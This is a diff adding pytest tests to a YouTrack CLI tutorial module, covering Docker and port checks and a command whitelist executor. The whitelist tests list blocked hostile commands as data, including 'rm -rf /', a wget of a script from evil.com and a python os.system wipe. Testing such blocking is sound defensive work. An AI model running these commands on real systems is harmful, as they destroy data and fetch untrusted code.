@@ -2,12 +2,20 @@
 
 import tempfile
 from pathlib import Path
-from unittest.mock import AsyncMock, Mock, patch
+from unittest.mock import AsyncMock, MagicMock, Mock, patch
 
 import pytest
+from docker.errors import DockerException
 
 from youtrack_cli.tutorial.core import TutorialEngine, TutorialModule, TutorialProgress, TutorialStep
-from youtrack_cli.tutorial.modules import IssuesTutorial, SetupTutorial, get_default_modules
+from youtrack_cli.tutorial.docker_utils import (
+    DockerNotAvailableError,
+    PortInUseError,
+    check_docker_available,
+    check_port_available,
+)
+from youtrack_cli.tutorial.executor import ClickCommandExecutor
+from youtrack_cli.tutorial.modules import DockerTutorial, IssuesTutorial, SetupTutorial, get_default_modules
 from youtrack_cli.tutorial.progress import ProgressTracker
 
 
@@ -719,3 +727,113 @@ class TestTutorialModuleAdvanced:
 
         assert steps1 is steps2
         assert len(steps1) > 0
+
+
+# === CONSOLIDATED DOCKER TUTORIAL TESTS ===
+
+
+class TestDockerUtils:
+    """Test Docker utility functions."""
+
+    @patch("youtrack_cli.tutorial.docker_utils.docker.from_env")
+    def test_check_docker_available_success(self, mock_docker):
+        """Test successful Docker availability check."""
+        mock_client = Mock()
+        mock_docker.return_value = mock_client
+
+        check_docker_available()
+
+        mock_client.ping.assert_called_once()
+
+    @patch("youtrack_cli.tutorial.docker_utils.docker.from_env")
+    def test_check_docker_available_failure(self, mock_docker):
+        """Test Docker availability check failure."""
+        mock_docker.side_effect = DockerException("Docker not available")
+
+        with pytest.raises(DockerNotAvailableError):
+            check_docker_available()
+
+    @patch("socket.socket")
+    def test_check_port_available_success(self, mock_socket):
+        """Test port availability check success."""
+        mock_sock = Mock()
+        mock_socket.return_value.__enter__.return_value = mock_sock
+        mock_sock.bind.return_value = None  # bind succeeds (port is free)
+
+        check_port_available(8080)  # Should not raise exception
+
+    @patch("socket.socket")
+    def test_check_port_available_failure(self, mock_socket):
+        """Test port availability check failure."""
+        mock_sock = Mock()
+        mock_socket.return_value.__enter__.return_value = mock_sock
+        mock_sock.bind.side_effect = OSError("Address already in use")
+
+        with pytest.raises(PortInUseError):
+            check_port_available(8080)
+
+
+class TestDockerTutorial:
+    """Test Docker tutorial module."""
+
+    @patch("youtrack_cli.tutorial.modules.cleanup_youtrack_resources")
+    def test_cleanup_resources(self, mock_cleanup):
+        """Test cleanup resources method."""
+        tutorial = DockerTutorial()
+        tutorial.cleanup_resources(remove_data=True)
+
+        mock_cleanup.assert_called_once_with(remove_data=True)
+
+
+# === CONSOLIDATED TUTORIAL EXECUTOR TESTS ===
+
+
+class TestClickCommandExecutor:
+    """Test cases for ClickCommandExecutor."""
+
+    def setup_method(self):
+        """Set up test fixtures."""
+        self.config_manager = MagicMock()
+        self.executor = ClickCommandExecutor(self.config_manager)
+
+    def test_init(self):
+        """Test executor initialization."""
+        assert self.executor.config_manager == self.config_manager
+        assert self.executor.console is not None
+        assert self.executor.auth_manager is not None
+        assert len(self.executor.allowed_commands) > 0
+
+    def test_is_command_allowed_basic_commands(self):
+        """Test command whitelist validation for basic commands."""
+        assert self.executor.is_command_allowed("yt --help")
+        assert self.executor.is_command_allowed("yt projects list")
+        assert self.executor.is_command_allowed("yt issues create FPU 'Test issue'")
+        assert self.executor.is_command_allowed("yt auth login")
+        assert self.executor.is_command_allowed("source .env.local && yt projects list")
+
+    def test_is_command_allowed_blocked_commands(self):
+        """Test command whitelist validation for blocked commands."""
+        assert not self.executor.is_command_allowed("rm -rf /")
+        assert not self.executor.is_command_allowed("curl malicious-site.com")
+        assert not self.executor.is_command_allowed("wget http://evil.com/script.sh")
+        assert not self.executor.is_command_allowed("python -c 'import os; os.system(\"rm -rf /\")'")
+        assert not self.executor.is_command_allowed("arbitrary_command")
+
+    def test_parse_command_basic(self):
+        """Test basic command parsing."""
+        args = self.executor.parse_command("yt projects list")
+        assert args == ["projects", "list"]
+
+    def test_tutorial_command_whitelist_coverage(self):
+        """Test that security whitelist covers common tutorial commands."""
+        common_tutorial_commands = [
+            "yt --help",
+            "yt projects list",
+            "yt issues list",
+            "yt auth status",
+            "yt tutorial list",
+            "source .env.local && yt projects list",
+        ]
+
+        for command in common_tutorial_commands:
+            assert self.executor.is_command_allowed(command), f"Command should be allowed: {command}"
